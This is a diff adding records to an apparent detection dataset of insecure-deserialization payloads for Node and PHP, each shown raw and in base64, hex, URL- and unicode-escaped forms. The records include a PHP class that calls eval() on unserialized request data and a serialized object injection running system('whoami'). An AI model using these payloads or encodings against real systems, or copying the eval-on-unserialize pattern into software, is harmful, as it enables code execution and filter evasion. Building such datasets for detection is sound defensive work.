+    "original_payload": "node-serialize",
+    "obfuscated_payload": "bm9kZS1zZXJpYWxpemU=",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 48163566,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00005__obf03",
+    "payload": "6e6f64652d73657269616c697a65",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00005",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Node.md",
+    "source_path": "Insecure Deserialization/Node.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "dd0d52d3eb5dfe7035764c71069c7feb4413fe21ced164ecf8f4d61de1fe6cd5",
+    "original_id": "raw_deser_00005",
+    "original_payload": "node-serialize",
+    "obfuscated_payload": "6e6f64652d73657269616c697a65",
+    "obfuscation_chain": [
+      "hex_bytes"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific_fallback",
+    "decoder_requirements": [
+      "hex_decode"
+    ],
+    "generation_seed": 48164575,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00005__obf04",
+    "payload": "bm9kZS1zZXJpYWxpemU",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00005",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Node.md",
+    "source_path": "Insecure Deserialization/Node.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "dd0d52d3eb5dfe7035764c71069c7feb4413fe21ced164ecf8f4d61de1fe6cd5",
+    "original_id": "raw_deser_00005",
+    "original_payload": "node-serialize",
+    "obfuscated_payload": "bm9kZS1zZXJpYWxpemU",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 48165584,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00006__obf01",
+    "payload": "unserialize%28%29",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00006",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Node.md",
+    "source_path": "Insecure Deserialization/Node.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "10360b691c8dbada499c4ead3bd8987dbdf9c8ce0c1b7dc6b94c57b75214e98c",
+    "original_id": "raw_deser_00006",
+    "original_payload": "unserialize()",
+    "obfuscated_payload": "unserialize%28%29",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 48262560,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00006__obf02",
+    "payload": "dW5zZXJpYWxpemUoKQ==",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00006",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Node.md",
+    "source_path": "Insecure Deserialization/Node.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "10360b691c8dbada499c4ead3bd8987dbdf9c8ce0c1b7dc6b94c57b75214e98c",
+    "original_id": "raw_deser_00006",
+    "original_payload": "unserialize()",
+    "obfuscated_payload": "dW5zZXJpYWxpemUoKQ==",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 48263569,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00006__obf03",
+    "payload": "unserialize\\u0028\\u0029",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00006",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Node.md",
+    "source_path": "Insecure Deserialization/Node.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "10360b691c8dbada499c4ead3bd8987dbdf9c8ce0c1b7dc6b94c57b75214e98c",
+    "original_id": "raw_deser_00006",
+    "original_payload": "unserialize()",
+    "obfuscated_payload": "unserialize\\u0028\\u0029",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 48264578,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00006__obf04",
+    "payload": "dW5zZXJpYWxpemVcdTAwMjgp",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00006",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Node.md",
+    "source_path": "Insecure Deserialization/Node.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "10360b691c8dbada499c4ead3bd8987dbdf9c8ce0c1b7dc6b94c57b75214e98c",
+    "original_id": "raw_deser_00006",
+    "original_payload": "unserialize()",
+    "obfuscated_payload": "dW5zZXJpYWxpemVcdTAwMjgp",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation",
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "unicode_escape_decode",
+      "base64url_decode"
+    ],
+    "generation_seed": 48265587,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00007__obf01",
+    "payload": "<?php \n    %63lass %50%48POb%6AectInjec%74i%6Fn{\n        pu%62lic $inject;\n        fu%6E%63t%69on __constru%63t(){\n        }\n        fun%63tion __wakeup(){\n            %69f(isset($this->inject)){\n                %65val($this%2D>in%6Ae%63t);\n            }\n        }\n    }\n    if(isset($%5FRE%51UE%53T['%72'])){  \n        $var%31=unserial%69z%65($_REQUEST['%72']);\n        if(is_array($v%61r1)){\n            e%63h%6F \"<br/>\".$va%72%31[0].\" - \".$var1[1];\n        }\n    }\n    else{\n        ec%68%6F \"\"; # not%68ing ha%70pens %68%65re\n    }\n?>",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00007",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "4126bf60cfbc6e328a423098598007e7fcdfca80e1ff8f97382f0b67450a7d7f",
+    "original_id": "raw_deser_00007",
+    "original_payload": "<?php \n    class PHPObjectInjection{\n        public $inject;\n        function __construct(){\n        }\n        function __wakeup(){\n            if(isset($this->inject)){\n                eval($this->inject);\n            }\n        }\n    }\n    if(isset($_REQUEST['r'])){  \n        $var1=unserialize($_REQUEST['r']);\n        if(is_array($var1)){\n            echo \"<br/>\".$var1[0].\" - \".$var1[1];\n        }\n    }\n    else{\n        echo \"\"; # nothing happens here\n    }\n?>",
+    "obfuscated_payload": "<?php \n    %63lass %50%48POb%6AectInjec%74i%6Fn{\n        pu%62lic $inject;\n        fu%6E%63t%69on __constru%63t(){\n        }\n        fun%63tion __wakeup(){\n            %69f(isset($this->inject)){\n                %65val($this%2D>in%6Ae%63t);\n            }\n        }\n    }\n    if(isset($%5FRE%51UE%53T['%72'])){  \n        $var%31=unserial%69z%65($_REQUEST['%72']);\n        if(is_array($v%61r1)){\n            e%63h%6F \"<br/>\".$va%72%31[0].\" - \".$var1[1];\n        }\n    }\n    else{\n        ec%68%6F \"\"; # not%68ing ha%70pens %68%65re\n    }\n?>",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 48362563,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00007__obf02",
+    "payload": "PD9waHAgCiAgICBjbGFzcyBQSFBPYmplY3RJbmplY3Rpb257CiAgICAgICAgcHVibGljICRpbmplY3Q7CiAgICAgICAgZnVuY3Rpb24gX19jb25zdHJ1Y3QoKXsKICAgICAgICB9CiAgICAgICAgZnVuY3Rpb24gX193YWtldXAoKXsKICAgICAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmluamVjdCkpewogICAgICAgICAgICAgICAgZXZhbCgkdGhpcy0+aW5qZWN0KTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIGlmKGlzc2V0KCRfUkVRVUVTVFsnciddKSl7ICAKICAgICAgICAkdmFyMT11bnNlcmlhbGl6ZSgkX1JFUVVFU1RbJ3InXSk7CiAgICAgICAgaWYoaXNfYXJyYXkoJHZhcjEpKXsKICAgICAgICAgICAgZWNobyAiPGJyLz4iLiR2YXIxWzBdLiIgLSAiLiR2YXIxWzFdOwogICAgICAgIH0KICAgIH0KICAgIGVsc2V7CiAgICAgICAgZWNobyAiIjsgIyBub3RoaW5nIGhhcHBlbnMgaGVyZQogICAgfQo/Pg==",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00007",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "4126bf60cfbc6e328a423098598007e7fcdfca80e1ff8f97382f0b67450a7d7f",
+    "original_id": "raw_deser_00007",
+    "original_payload": "<?php \n    class PHPObjectInjection{\n        public $inject;\n        function __construct(){\n        }\n        function __wakeup(){\n            if(isset($this->inject)){\n                eval($this->inject);\n            }\n        }\n    }\n    if(isset($_REQUEST['r'])){  \n        $var1=unserialize($_REQUEST['r']);\n        if(is_array($var1)){\n            echo \"<br/>\".$var1[0].\" - \".$var1[1];\n        }\n    }\n    else{\n        echo \"\"; # nothing happens here\n    }\n?>",
+    "obfuscated_payload": "PD9waHAgCiAgICBjbGFzcyBQSFBPYmplY3RJbmplY3Rpb257CiAgICAgICAgcHVibGljICRpbmplY3Q7CiAgICAgICAgZnVuY3Rpb24gX19jb25zdHJ1Y3QoKXsKICAgICAgICB9CiAgICAgICAgZnVuY3Rpb24gX193YWtldXAoKXsKICAgICAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmluamVjdCkpewogICAgICAgICAgICAgICAgZXZhbCgkdGhpcy0+aW5qZWN0KTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIGlmKGlzc2V0KCRfUkVRVUVTVFsnciddKSl7ICAKICAgICAgICAkdmFyMT11bnNlcmlhbGl6ZSgkX1JFUVVFU1RbJ3InXSk7CiAgICAgICAgaWYoaXNfYXJyYXkoJHZhcjEpKXsKICAgICAgICAgICAgZWNobyAiPGJyLz4iLiR2YXIxWzBdLiIgLSAiLiR2YXIxWzFdOwogICAgICAgIH0KICAgIH0KICAgIGVsc2V7CiAgICAgICAgZWNobyAiIjsgIyBub3RoaW5nIGhhcHBlbnMgaGVyZQogICAgfQo/Pg==",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 48363572,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00007__obf03",
+    "payload": "<?php+\n+class%0APHPObjectInjection\\u007b\n%0Apublic%0A\\u0024inject\\u003b\n%09function%09__construct(\\u0029{\n%0A}\n%09function%0A__wakeup(\\u0029\\u007b\n%0Aif\\u0028isset\\u0028$this-\\u003einject\\u0029)\\u007b\n%0Aeval\\u0028$this-\\u003einject\\u0029;\n+\\u007d\n+\\u007d\n%0A}\n%0Aif(isset(\\u0024_REQUEST\\u005b\\u0027r']\\u0029)\\u007b%0A\n%09$var1=unserialize\\u0028$_REQUEST\\u005b'r'])\\u003b\n+if(is_array\\u0028\\u0024var1))\\u007b\n+echo%0A\\u0022<br/\\u003e\\u0022.$var1\\u005b0\\u005d.\\u0022%09-%09\\u0022.\\u0024var1\\u005b1\\u005d\\u003b\n%09}\n%09\\u007d\n%0Aelse\\u007b\n%0Aecho+\"\\u0022\\u003b%09#%09nothing%0Ahappens%09here\n+\\u007d\n?\\u003e",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00007",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "4126bf60cfbc6e328a423098598007e7fcdfca80e1ff8f97382f0b67450a7d7f",
+    "original_id": "raw_deser_00007",
+    "original_payload": "<?php \n    class PHPObjectInjection{\n        public $inject;\n        function __construct(){\n        }\n        function __wakeup(){\n            if(isset($this->inject)){\n                eval($this->inject);\n            }\n        }\n    }\n    if(isset($_REQUEST['r'])){  \n        $var1=unserialize($_REQUEST['r']);\n        if(is_array($var1)){\n            echo \"<br/>\".$var1[0].\" - \".$var1[1];\n        }\n    }\n    else{\n        echo \"\"; # nothing happens here\n    }\n?>",
+    "obfuscated_payload": "<?php+\n+class%0APHPObjectInjection\\u007b\n%0Apublic%0A\\u0024inject\\u003b\n%09function%09__construct(\\u0029{\n%0A}\n%09function%0A__wakeup(\\u0029\\u007b\n%0Aif\\u0028isset\\u0028$this-\\u003einject\\u0029)\\u007b\n%0Aeval\\u0028$this-\\u003einject\\u0029;\n+\\u007d\n+\\u007d\n%0A}\n%0Aif(isset(\\u0024_REQUEST\\u005b\\u0027r']\\u0029)\\u007b%0A\n%09$var1=unserialize\\u0028$_REQUEST\\u005b'r'])\\u003b\n+if(is_array\\u0028\\u0024var1))\\u007b\n+echo%0A\\u0022<br/\\u003e\\u0022.$var1\\u005b0\\u005d.\\u0022%09-%09\\u0022.\\u0024var1\\u005b1\\u005d\\u003b\n%09}\n%09\\u007d\n%0Aelse\\u007b\n%0Aecho+\"\\u0022\\u003b%09#%09nothing%0Ahappens%09here\n+\\u007d\n?\\u003e",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation",
+      "whitespace_variant"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 48364581,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00007__obf04",
+    "payload": "PD9waHAlMEEKJTA5Y2xhc3MlMDlQSFBPYmplY3RJbmplY3Rpb257CitwdWJsaWMrJGluamVjdDsKJTA5ZnVuY3Rpb24rX19jb25zdHJ1Y3QoKXsKK30KJTBBZnVuY3Rpb24rX193YWtldXAoKXsKJTBBaWYoaXNzZXQoJHRoaXMtPmluamVjdCkpewolMDlldmFsKCR0aGlzLT5pbmplY3QpOwolMDl9CiUwOX0KJTBBfQolMEFpZihpc3NldCgkX1JFUVVFU1RbJ3InXSkpeyUwOQolMEEkdmFyMT11bnNlcmlhbGl6ZSgkX1JFUVVFU1RbJ3InXSk7CiUwQWlmKGlzX2FycmF5KCR2YXIxKSl7CiUwQWVjaG8rIjxici8+Ii4kdmFyMVswXS4iJTBBLSsiLiR2YXIxWzFdOwolMDl9CiUwOX0KK2Vsc2V7CiUwQWVjaG8lMDkiIjslMEEjK25vdGhpbmcraGFwcGVucyUwQWhlcmUKJTBBfQo/Pg==",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00007",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "4126bf60cfbc6e328a423098598007e7fcdfca80e1ff8f97382f0b67450a7d7f",
+    "original_id": "raw_deser_00007",
+    "original_payload": "<?php \n    class PHPObjectInjection{\n        public $inject;\n        function __construct(){\n        }\n        function __wakeup(){\n            if(isset($this->inject)){\n                eval($this->inject);\n            }\n        }\n    }\n    if(isset($_REQUEST['r'])){  \n        $var1=unserialize($_REQUEST['r']);\n        if(is_array($var1)){\n            echo \"<br/>\".$var1[0].\" - \".$var1[1];\n        }\n    }\n    else{\n        echo \"\"; # nothing happens here\n    }\n?>",
+    "obfuscated_payload": "PD9waHAlMEEKJTA5Y2xhc3MlMDlQSFBPYmplY3RJbmplY3Rpb257CitwdWJsaWMrJGluamVjdDsKJTA5ZnVuY3Rpb24rX19jb25zdHJ1Y3QoKXsKK30KJTBBZnVuY3Rpb24rX193YWtldXAoKXsKJTBBaWYoaXNzZXQoJHRoaXMtPmluamVjdCkpewolMDlldmFsKCR0aGlzLT5pbmplY3QpOwolMDl9CiUwOX0KJTBBfQolMEFpZihpc3NldCgkX1JFUVVFU1RbJ3InXSkpeyUwOQolMEEkdmFyMT11bnNlcmlhbGl6ZSgkX1JFUVVFU1RbJ3InXSk7CiUwQWlmKGlzX2FycmF5KCR2YXIxKSl7CiUwQWVjaG8rIjxici8+Ii4kdmFyMVswXS4iJTBBLSsiLiR2YXIxWzFdOwolMDl9CiUwOX0KK2Vsc2V7CiUwQWVjaG8lMDkiIjslMEEjK25vdGhpbmcraGFwcGVucyUwQWhlcmUKJTBBfQo/Pg==",
+    "obfuscation_chain": [
+      "whitespace_variant",
+      "base64_standard"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 48365590,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00008__obf01",
+    "payload": "$va%721=unserialize($_%52EQ%55ES%54['r']);",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00008",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "520b1d2185d532b20b3315659180a251d1d98ec64c0d546ef14b92b4af24acc1",
+    "original_id": "raw_deser_00008",
+    "original_payload": "$var1=unserialize($_REQUEST['r']);",
+    "obfuscated_payload": "$va%721=unserialize($_%52EQ%55ES%54['r']);",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 48462566,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00008__obf02",
+    "payload": "JHZhcjE9dW5zZXJpYWxpemUoJF9SRVFVRVNUWydyJ10pOw==",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00008",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "520b1d2185d532b20b3315659180a251d1d98ec64c0d546ef14b92b4af24acc1",
+    "original_id": "raw_deser_00008",
+    "original_payload": "$var1=unserialize($_REQUEST['r']);",
+    "obfuscated_payload": "JHZhcjE9dW5zZXJpYWxpemUoJF9SRVFVRVNUWydyJ10pOw==",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 48463575,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00008__obf03",
+    "payload": "$var1=unserialize(\\u0024_REQUEST['r'\\u005d)\\u003b",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00008",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "520b1d2185d532b20b3315659180a251d1d98ec64c0d546ef14b92b4af24acc1",
+    "original_id": "raw_deser_00008",
+    "original_payload": "$var1=unserialize($_REQUEST['r']);",
+    "obfuscated_payload": "$var1=unserialize(\\u0024_REQUEST['r'\\u005d)\\u003b",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 48464584,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00008__obf04",
+    "payload": "$va%721=unserialize($%5FREQUEST['r']);",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00008",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "520b1d2185d532b20b3315659180a251d1d98ec64c0d546ef14b92b4af24acc1",
+    "original_id": "raw_deser_00008",
+    "original_payload": "$var1=unserialize($_REQUEST['r']);",
+    "obfuscated_payload": "$va%721=unserialize($%5FREQUEST['r']);",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 48465593,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00009__obf01",
+    "payload": "%73tr%69%6Eg(68) \"O:%318:\"%50HPObjectInject%69on\":1:{s:6:\"i%6Eject\";s:17:\"%73y%73tem('w%68oami');\";}\"",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00009",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "808f7db0e294ef56ab45236baaddd9b39338b13d8c223491dd1531dee54a9efd",
+    "original_id": "raw_deser_00009",
+    "original_payload": "string(68) \"O:18:\"PHPObjectInjection\":1:{s:6:\"inject\";s:17:\"system('whoami');\";}\"",
+    "obfuscated_payload": "%73tr%69%6Eg(68) \"O:%318:\"%50HPObjectInject%69on\":1:{s:6:\"i%6Eject\";s:17:\"%73y%73tem('w%68oami');\";}\"",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 48562569,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00009__obf02",
+    "payload": "c3RyaW5nKDY4KSAiTzoxODoiUEhQT2JqZWN0SW5qZWN0aW9uIjoxOntzOjY6ImluamVjdCI7czoxNzoic3lzdGVtKCd3aG9hbWknKTsiO30i",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00009",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "808f7db0e294ef56ab45236baaddd9b39338b13d8c223491dd1531dee54a9efd",
+    "original_id": "raw_deser_00009",
+    "original_payload": "string(68) \"O:18:\"PHPObjectInjection\":1:{s:6:\"inject\";s:17:\"system('whoami');\";}\"",
+    "obfuscated_payload": "c3RyaW5nKDY4KSAiTzoxODoiUEhQT2JqZWN0SW5qZWN0aW9uIjoxOntzOjY6ImluamVjdCI7czoxNzoic3lzdGVtKCd3aG9hbWknKTsiO30i",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 48563578,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00009__obf03",
+    "payload": "string(68)%09\"O:18:\"PHPObjectInjection\":1:{s:6:\"inject\";s:17:\"system('whoami');\";}\"",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00009",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "808f7db0e294ef56ab45236baaddd9b39338b13d8c223491dd1531dee54a9efd",
+    "original_id": "raw_deser_00009",
+    "original_payload": "string(68) \"O:18:\"PHPObjectInjection\":1:{s:6:\"inject\";s:17:\"system('whoami');\";}\"",
+    "obfuscated_payload": "string(68)%09\"O:18:\"PHPObjectInjection\":1:{s:6:\"inject\";s:17:\"system('whoami');\";}\"",
+    "obfuscation_chain": [
+      "whitespace_variant"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 48564587,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_deser_00009__obf04",
+    "payload": "string(6%38) \"O:%318:\"PHPObjectI%6Ej%65%63tion\":1:{s:6:\"inje%63t\";s:17:\"s%79stem('who%61mi');\";}\"",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00009",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "808f7db0e294ef56ab45236baaddd9b39338b13d8c223491dd1531dee54a9efd",
+    "original_id": "raw_deser_00009",
+    "original_payload": "string(68) \"O:18:\"PHPObjectInjection\":1:{s:6:\"inject\";s:17:\"system('whoami');\";}\"",
+    "obfuscated_payload": "string(6%38) \"O:%318:\"PHPObjectI%6Ej%65%63tion\":1:{s:6:\"inje%63t\";s:17:\"s%79stem('who%61mi');\";}\"",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 48565596,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00010__obf01",
+    "payload": "%3C%3Fphp%0A%24data%20%3D%20unserialize%28%24_COOKIE%5B%27auth%27%5D%29%3B%0A%0Aif%20%28%24data%5B%27username%27%5D%20%3D%3D%20%24adminName%20%26%26%20%24data%5B%27password%27%5D%20%3D%3D%20%24adminPassword%29%20%7B%0A%20%20%20%20%24admin%20%3D%20true%3B%0A%7D%20else%20%7B%0A%20%20%20%20%24admin%20%3D%20false%3B%0A%7D",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00010",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
